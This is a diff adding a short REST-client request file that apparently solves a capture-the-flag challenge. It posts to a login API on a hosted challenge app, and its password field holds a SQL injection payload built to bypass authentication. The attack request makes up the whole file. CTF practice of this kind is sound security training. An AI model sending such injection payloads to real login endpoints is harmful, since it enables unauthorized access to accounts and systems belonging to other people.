@@ -1,0 +1,11 @@
+@url = https://chal49-dsds35.vercel.app
+
+POST {{url}}/api/login HTTP/1.1
+Content-Type: application/json
+
+{
+  "user": "aaaa",
+  "password": "'OR'1'LIKE'1"
+}
+
+###
